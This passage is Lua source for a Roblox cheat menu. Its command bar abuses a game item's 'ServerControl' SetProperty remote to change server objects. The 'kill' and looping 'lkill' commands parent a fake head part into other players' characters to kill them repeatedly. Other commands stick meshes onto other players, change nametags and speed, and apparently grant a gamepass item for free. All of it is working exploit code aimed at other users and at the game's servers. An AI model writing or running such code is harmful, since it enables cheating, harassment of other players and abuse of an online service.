				HAX:FireEvent("PompousTheCloud", MainUserW["PompousTheCloud"]["Handle"]["Mesh"],"TextureId",texture)
				HAX:FireEvent("PompousTheCloud", MainUserW["PompousTheCloud"]["Handle"]["Mesh"],"Scale",Vector3.new(4,4,4))
				HAX:FireEvent("PompousTheCloud", MainUserW["PompousTheCloud"]["Handle"]["Mesh"],"Parent",game:GetService("Players")[v.Name].Character.Head)
				lplr.Character:WaitForChild("PompousTheCloud"):Destroy()
				game.workspace.GiveTool:FireServer(gamepass, "PompousTheCloud")
			end
		end
		if string.sub(CMDBAR.Text, 1, 5) == ("kill ") then
			for i,v in pairs(GetPlayer(string.sub(CMDBAR.Text, 6))) do
			local UserName  = game:GetService('Players').LocalPlayer.Name
			local CE = {}
			local Variables = {
				workspace = game:GetService("Workspace"),
				players = game:GetService("Players")
			}

			local MainUserP, MainUserW = Variables.players.LocalPlayer, Variables.workspace:FindFirstChild(UserName)

			function CE:FireEvent(ItemName, Object, Property, Value)
				MainUserW:FindFirstChild(ItemName)["ServerControl"]:InvokeServer("SetProperty",{["Value"]=Value,["Property"]=Property,["Object"]=Object})
			end
			
			game.Workspace.GiveTool:FireServer(gamepass, "PompousTheCloud")

			MainUserP["Backpack"]:WaitForChild("PompousTheCloud").Parent = MainUserW
			
			CE:FireEvent("PompousTheCloud", MainUserW.PompousTheCloud.Handle,"Name","Head")
			CE:FireEvent("PompousTheCloud", MainUserW.PompousTheCloud.Head.Mesh,"MeshId","0")
			CE:FireEvent("PompousTheCloud", MainUserW.PompousTheCloud.Head,"Parent",game.Players[v.Name].Character)
			
			game.Players.LocalPlayer.Character.PompousTheCloud:Remove()
			
			game.Workspace.GiveTool:FireServer(gamepass, "PompousTheCloud")
			end
		end
		if string.sub(CMDBAR.Text, 1, 6) == ("lkill ") then
			for i,v in pairs(GetPlayer(string.sub(CMDBAR.Text, 7))) do
			local UserName  = game:GetService('Players').LocalPlayer.Name
			local CE = {}
			local Variables = {
				workspace = game:GetService("Workspace"),
				players = game:GetService("Players")
			}

			local MainUserP, MainUserW = Variables.players.LocalPlayer, Variables.workspace:FindFirstChild(UserName)

			function CE:FireEvent(ItemName, Object, Property, Value)
				MainUserW:FindFirstChild(ItemName)["ServerControl"]:InvokeServer("SetProperty",{["Value"]=Value,["Property"]=Property,["Object"]=Object})
			end
			_G.lkill = true
			while _G.lkill do
			game.Workspace.GiveTool:FireServer(gamepass, "PompousTheCloud")

			if not game.Players.LocalPlayer.Character:FindFirstChild("PompousTheCloud") then
				MainUserP["Backpack"]:WaitForChild("PompousTheCloud").Parent = MainUserW
			end
			
			CE:FireEvent("PompousTheCloud", MainUserW.PompousTheCloud.Handle,"Name","Head")
			CE:FireEvent("PompousTheCloud", MainUserW.PompousTheCloud.Head.Mesh,"MeshId","0")
			CE:FireEvent("PompousTheCloud", MainUserW.PompousTheCloud.Head,"Parent",game.Players[v.Name].Character)

			game.Players.LocalPlayer.Character.PompousTheCloud:Remove()
			wait()
				end
			end
		end
		if string.sub(CMDBAR.Text,1,7) == ("unlkill")then
			_G.lkill = false
		end
		if string.sub(CMDBAR.Text, 1, 6) == ("mario ") then
			for i,v in pairs(GetPlayer(string.sub(CMDBAR.Text,7)))do
				game.workspace.GiveTool:FireServer(gamepass, "PompousTheCloud")
				local UserName  = game:GetService('Players').LocalPlayer.Name
				
				local HAX = {}
				local Variables = {
					workspace = game:GetService("Workspace"),
					players = game:GetService("Players")
				}
				
				local MainUserP, MainUserW = Variables.players.LocalPlayer, Variables.workspace:FindFirstChild(UserName)
				
				function HAX:FireEvent(ItemName, Object, Property, Value)
					MainUserW:FindFirstChild(ItemName)["ServerControl"]:InvokeServer("SetProperty",{["Value"]=Value,["Property"]=Property,["Object"]=Object})
				end
				
				Variables.workspace.Buy:FireServer(0, "PompousTheCloud")
				MainUserP["Backpack"]:WaitForChild("PompousTheCloud").Parent = MainUserW
				
				local mesh = "rbxassetid://849882710"
				local texture = "rbxassetid://849882719"
				
				HAX:FireEvent("PompousTheCloud", MainUserW["PompousTheCloud"]["Handle"]["Mesh"],"MeshId",mesh)
				HAX:FireEvent("PompousTheCloud", MainUserW["PompousTheCloud"]["Handle"]["Mesh"],"TextureId",texture)
				HAX:FireEvent("PompousTheCloud", MainUserW["PompousTheCloud"]["Handle"]["Mesh"],"Scale",Vector3.new(2,2,2))
				HAX:FireEvent("PompousTheCloud", MainUserW["PompousTheCloud"]["Handle"]["Mesh"],"Parent",game.Players[v.Name].Character.Head)
				lplr.Character:WaitForChild("PompousTheCloud"):Destroy()
				game.workspace.GiveTool:FireServer(gamepass, "PompousTheCloud")
			end
		end	
		if string.sub(CMDBAR.Text, 1, 8) == ("scoobis ") then
			for i,v in pairs(GetPlayer(string.sub(CMDBAR.Text,9)))do
				game.workspace.GiveTool:FireServer(gamepass, "PompousTheCloud")
				local UserName  = game:GetService('Players').LocalPlayer.Name
								
				local HAX = {}
				local Variables = {
				workspace = game:GetService("Workspace"),
				players = game:GetService("Players")
				}
								
				local MainUserP, MainUserW = Variables.players.LocalPlayer, Variables.workspace:FindFirstChild(UserName)
								
				function HAX:FireEvent(ItemName, Object, Property, Value)
					MainUserW:FindFirstChild(ItemName)["ServerControl"]:InvokeServer("SetProperty",{["Value"]=Value,["Property"]=Property,["Object"]=Object})
				end
								
				Variables.workspace.Buy:FireServer(0, "PompousTheCloud")
				MainUserP["Backpack"]:WaitForChild("PompousTheCloud").Parent = MainUserW
								
				local mesh = "rbxassetid://1107996700"
				local texture = "rbxassetid://1107996710"
				
				HAX:FireEvent("PompousTheCloud", MainUserW["PompousTheCloud"]["Handle"]["Mesh"],"MeshId",mesh)
				HAX:FireEvent("PompousTheCloud", MainUserW["PompousTheCloud"]["Handle"]["Mesh"],"TextureId",texture)
				HAX:FireEvent("PompousTheCloud", MainUserW["PompousTheCloud"]["Handle"]["Mesh"],"Scale",Vector3.new(0.05,0.05,0.05))
				HAX:FireEvent("PompousTheCloud", MainUserW["PompousTheCloud"]["Handle"]["Mesh"],"Parent",game.Players[v.Name].Character.Head)
				lplr.Character:WaitForChild("PompousTheCloud"):Destroy()
				game.workspace.GiveTool:FireServer(gamepass, "PompousTheCloud")
			end
		end
		if string.sub(CMDBAR.Text, 1, 2) == ("rj") then
			return pcall(function()
            game:GetService("TeleportService"):Teleport(game.PlaceId, game:GetService("Players").LocalPlayer)
			end)
		end
		if string.sub(CMDBAR.Text, 1, 3) == ("sui") then
			lplr.Character.Torso:Destroy()
		end
		if string.sub(CMDBAR.Text, 1, 3) == ("nin") then
			game.workspace.GiveTool:FireServer(gamepass, "PompousTheCloud")
			local UserName  = game:GetService('Players').LocalPlayer.Name				
			local HAX = {}
			local Variables = {
			workspace = game:GetService("Workspace"),
			players = game:GetService("Players")
			}
							
			local MainUserP, MainUserW = Variables.players.LocalPlayer, Variables.workspace:FindFirstChild(UserName)
							
			function HAX:FireEvent(ItemName, Object, Property, Value)
				MainUserW:FindFirstChild(ItemName)["ServerControl"]:InvokeServer("SetProperty",{["Value"]=Value,["Property"]=Property,["Object"]=Object})
			end
							
			Variables.workspace.Buy:FireServer(0, "PompousTheCloud")
			MainUserP["Backpack"]:WaitForChild("PompousTheCloud").Parent = MainUserW
							
			local mesh = "rbxassetid://831283709"
			local texture = "rbxassetid://831284490"
		
			lplr.Character.Humanoid.HipHeight = "1"
			
			HAX:FireEvent("PompousTheCloud", MainUserW["PompousTheCloud"]["Handle"]["Mesh"],"MeshId",mesh)
			HAX:FireEvent("PompousTheCloud", MainUserW["PompousTheCloud"]["Handle"]["Mesh"],"TextureId",texture)
			HAX:FireEvent("PompousTheCloud", MainUserW["PompousTheCloud"]["Handle"]["Mesh"],"Scale",Vector3.new(2,2,2))
			HAX:FireEvent("PompousTheCloud", MainUserW["PompousTheCloud"]["Handle"]["Mesh"],"Offset",Vector3.new(2.2,0,0))
			HAX:FireEvent("PompousTheCloud", MainUserW["PompousTheCloud"]["Handle"]["Mesh"],"Parent",lplr.Character["Right Arm"])
			lplr.Character:WaitForChild("PompousTheCloud"):Destroy()
			game.workspace.GiveTool:FireServer(gamepass, "PompousTheCloud")
			wait()
			MainUserP["Backpack"]:WaitForChild("PompousTheCloud").Parent = MainUserW
			HAX:FireEvent("PompousTheCloud", MainUserW["PompousTheCloud"]["Handle"]["Mesh"],"MeshId","rbxassetid://831285741")
			HAX:FireEvent("PompousTheCloud", MainUserW["PompousTheCloud"]["Handle"]["Mesh"],"TextureId","rbxassetid://831286572")
			HAX:FireEvent("PompousTheCloud", MainUserW["PompousTheCloud"]["Handle"]["Mesh"],"Scale",Vector3.new(2,2,2))
			HAX:FireEvent("PompousTheCloud", MainUserW["PompousTheCloud"]["Handle"]["Mesh"],"Offset",Vector3.new(-2.2,0,0))
			HAX:FireEvent("PompousTheCloud", MainUserW["PompousTheCloud"]["Handle"]["Mesh"],"Parent",lplr.Character["Left Arm"])
			lplr.Character:WaitForChild("PompousTheCloud"):Destroy()
			game.workspace.GiveTool:FireServer(gamepass, "PompousTheCloud")
			MainUserP["Backpack"]:WaitForChild("PompousTheCloud").Parent = MainUserW
			HAX:FireEvent("PompousTheCloud", MainUserW["PompousTheCloud"]["Handle"]["Mesh"],"MeshId","rbxassetid://831282170")
			HAX:FireEvent("PompousTheCloud", MainUserW["PompousTheCloud"]["Handle"]["Mesh"],"TextureId","rbxassetid://831282317")
			HAX:FireEvent("PompousTheCloud", MainUserW["PompousTheCloud"]["Handle"]["Mesh"],"Scale",Vector3.new(2,2,2))
			HAX:FireEvent("PompousTheCloud", MainUserW["PompousTheCloud"]["Handle"]["Mesh"],"Parent",lplr.Character["Torso"])
			lplr.Character:WaitForChild("PompousTheCloud"):Destroy()
			game.workspace.GiveTool:FireServer(gamepass, "PompousTheCloud")
			MainUserP["Backpack"]:WaitForChild("PompousTheCloud").Parent = MainUserW
			HAX:FireEvent("PompousTheCloud", MainUserW["Head"],"Transparency","1")
			HAX:FireEvent("PompousTheCloud", MainUserW["Left Leg"]:Remove())
			HAX:FireEvent("PompousTheCloud", MainUserW["Right Leg"]:Remove())
			HAX:FireEvent("PompousTheCloud", MainUserW["Head"]["face"]:Remove())
			HAX:FireEvent("PompousTheCloud",MainUserW["Head"]["NametagTemplate"]["TagText"],"Text","Nintendo")
			HAX:FireEvent("PompousTheCloud",MainUserW["Head"]["NametagTemplate"]["TagText"],"TextStrokeColor3",Color3.fromRGB(51, 201, 255))
			HAX:FireEvent("PompousTheCloud",MainUserW["Head"]["NametagTemplate"],"Size",UDim2.new(2.4,2.4, 2.4, 2.4))
			MainUserW:WaitForChild("PompousTheCloud").Parent = MainUserP["Backpack"]
			for i,v in pairs(lplayer.Character:GetChildren()) do
				if (v:IsA("Accessory")) or (v:IsA("Hat")) then
					v:Remove()
				end
			end
			MainUserW["PompousTheCloud"].Parent = MainUserP["Backpack"]
		end
		if string.sub(CMDBAR.Text, 1, 9) == ("anonymous") then
			local UserName  = game:GetService('Players').LocalPlayer.Name
			local mesh, texture = 151354972, 151908297
			local CE = {}
			local Variables = {
				workspace = game:GetService("Workspace"),
				players = game:GetService("Players")
			}

			local MainUserP, MainUserW = Variables.players.LocalPlayer, Variables.workspace:FindFirstChild(UserName)

			function CE:FireEvent(ItemName, Object, Property, Value)
				MainUserW:FindFirstChild(ItemName)["ServerControl"]:InvokeServer("SetProperty",{["Value"]=Value,["Property"]=Property,["Object"]=Object})
			end


			game.Workspace.GiveTool:FireServer(gamepass, "PompousTheCloud")
			if not game.Players.LocalPlayer.Character:FindFirstChild("PompousTheCloud") then
				MainUserP["Backpack"]:WaitForChild("PompousTheCloud").Parent = MainUserW
			end
			
			for i,v in pairs(lplayer.Character:GetChildren()) do
				if (v:IsA("Accessory")) or (v:IsA("Hat")) then
					CE:FireEvent("PompousTheCloud",game.Players.LocalPlayer.Character[v.Name].Handle,"Transparency",1)
				end
			end
			if lplayer.Character.Head:FindFirstChild("NametagTemplate") then
				CE:FireEvent("PompousTheCloud",MainUserW["Head"]["NametagTemplate"]["TagText"],"Text","Anonymous")
				CE:FireEvent("PompousTheCloud",MainUserW["Head"]["NametagTemplate"]["TagText"],"TextColor3",Color3.fromRGB(0,0,0))
				CE:FireEvent("PompousTheCloud",MainUserW["Head"]["NametagTemplate"]["TagText"],"TextStrokeColor3",Color3.fromRGB(40, 127, 71))
				CE:FireEvent("PompousTheCloud",MainUserW["Head"]["NametagTemplate"],"Size",UDim2.new(2.5, 0, 2.5, 0))
			end
			CE:FireEvent("PompousTheCloud",MainUserW["Shirt"],"ShirtTemplate","rbxassetid://133708636")
			CE:FireEvent("PompousTheCloud",MainUserW["Pants"],"PantsTemplate","rbxassetid://97164626")

			CE:FireEvent("PompousTheCloud",MainUserW["Torso"],"Color",Color3.fromRGB(0,0,0))
			CE:FireEvent("PompousTheCloud",MainUserW["Head"]["Mesh"],"MeshId","rbxassetid://"..mesh)
			CE:FireEvent("PompousTheCloud",MainUserW["Head"]["Mesh"],"Scale",Vector3.new(0.9,0.9,0.9))
			CE:FireEvent("PompousTheCloud",MainUserW["Head"]["Mesh"],"Offset",Vector3.new(0,0.21,-0.16))
			CE:FireEvent("PompousTheCloud",MainUserW["Head"]["Mesh"],"TextureId","rbxassetid://"..texture)
		end
		if string.sub(CMDBAR.Text,1,6) == ("melon ") then
			for i,v in pairs(GetPlayer(string.sub(CMDBAR.Text,7)))do
				game.workspace.GiveTool:FireServer(gamepass, "PompousTheCloud")
				local UserName  = game:GetService('Players').LocalPlayer.Name
								
				local HAX = {}
				local Variables = {
				workspace = game:GetService("Workspace"),
				players = game:GetService("Players")
				}
								
				local MainUserP, MainUserW = Variables.players.LocalPlayer, Variables.workspace:FindFirstChild(UserName)
								
				function HAX:FireEvent(ItemName, Object, Property, Value)
					MainUserW:FindFirstChild(ItemName)["ServerControl"]:InvokeServer("SetProperty",{["Value"]=Value,["Property"]=Property,["Object"]=Object})
				end
								
				Variables.workspace.Buy:FireServer(0, "PompousTheCloud")
				MainUserP["Backpack"]:WaitForChild("PompousTheCloud").Parent = MainUserW
								
				local mesh = "rbxassetid://677827629"
				local texture = "rbxassetid://677827685"
				
				HAX:FireEvent("PompousTheCloud", MainUserW["PompousTheCloud"]["Handle"]["Mesh"],"MeshId",mesh)
				HAX:FireEvent("PompousTheCloud", MainUserW["PompousTheCloud"]["Handle"]["Mesh"],"TextureId",texture)
				HAX:FireEvent("PompousTheCloud", MainUserW["PompousTheCloud"]["Handle"]["Mesh"],"Scale",Vector3.new(1,1,1))
				HAX:FireEvent("PompousTheCloud", MainUserW["PompousTheCloud"]["Handle"]["Mesh"],"Parent",game.Players[v.Name].Character["Head"])
				lplr.Character:WaitForChild("PompousTheCloud"):Destroy()
				game.workspace.GiveTool:FireServer(gamepass, "PompousTheCloud")
			end
		end
		if string.sub(CMDBAR.Text, 1, 3) == ("ws ") then
			lplayer.Character.Humanoid.WalkSpeed = (string.sub(CMDBAR.Text, 4))
		end
		if string.sub(CMDBAR.Text, 1, 3) == ("hh ") then
			lplayer.Character.Humanoid.HipHeight = (string.sub(CMDBAR.Text, 4))
		end
		if string.sub(CMDBAR.Text, 1, 3) == ("jp ") then
			lplayer.Character.Humanoid.JumpPower = (string.sub(CMDBAR.Text, 4))
		end
		if string.sub(CMDBAR.Text, 1, 5) == ("goto ") then
			for i,v in pairs(GetPlayer(string.sub(CMDBAR.Text, 6))) do
				lplayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[v.Name].Character.HumanoidRootPart.CFrame
			end
		end
		if string.sub(CMDBAR.Text,1,6) == ("rbtool") then
			local UserName  = game:GetService('Players').LocalPlayer.Name

			local CE = {}
			local Variables = {
				workspace = game:GetService("Workspace"),
				players = game:GetService("Players")
			}

			local MainUserP, MainUserW = Variables.players.LocalPlayer, Variables.workspace:FindFirstChild(UserName)

			function CE:FireEvent(ItemName, Object, Property, Value)
				MainUserW:FindFirstChild(ItemName)["ServerControl"]:InvokeServer("SetProperty",{["Value"]=Value,["Property"]=Property,["Object"]=Object})
			end

			game.Workspace.GiveTool:FireServer(gamepass, "PompousTheCloud")
			if not game.Players.LocalPlayer.Character:FindFirstChild("PompousTheCloud") then
				MainUserP["Backpack"]:WaitForChild("PompousTheCloud").Parent = MainUserW
			end
			
			if MainUserW.PompousTheCloud:FindFirstChild("LocalScript") then
				MainUserW.PompousTheCloud:FindFirstChild("LocalScript"):Remove()
				else
			end
			
			
			CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"]["Handle"]["Mesh"],"MeshId","0")
					
			for i,v in pairs(lplr.Character:GetChildren()) do
				if (v:IsA("Tool")) then
					CE:FireEvent("PompousTheCloud",game.Players.LocalPlayer.Character[v.Name].Handle,"Material",Enum.Material.ForceField)
					while wait() do
					CE:FireEvent("PompousTheCloud",game.Players.LocalPlayer.Character[v.Name].Handle,"BrickColor",BrickColor.new("Really red"))
					wait(.01)
					CE:FireEvent("PompousTheCloud",game.Players.LocalPlayer.Character[v.Name].Handle,"BrickColor",BrickColor.new("Lime green"))
					wait(.01)
					CE:FireEvent("PompousTheCloud",game.Players.LocalPlayer.Character[v.Name].Handle,"BrickColor",BrickColor.new("Really blue"))
					wait(.01)
					CE:FireEvent("PompousTheCloud",game.Players.LocalPlayer.Character[v.Name].Handle,"BrickColor",BrickColor.new("New Yeller"))
					wait(.01)
					CE:FireEvent("PompousTheCloud",game.Players.LocalPlayer.Character[v.Name].Handle,"BrickColor",BrickColor.new("Deep orange"))
					end
				end
			end
			CMDBAR.Text = ""
			Frame.Visible = false
		end
	end
end)
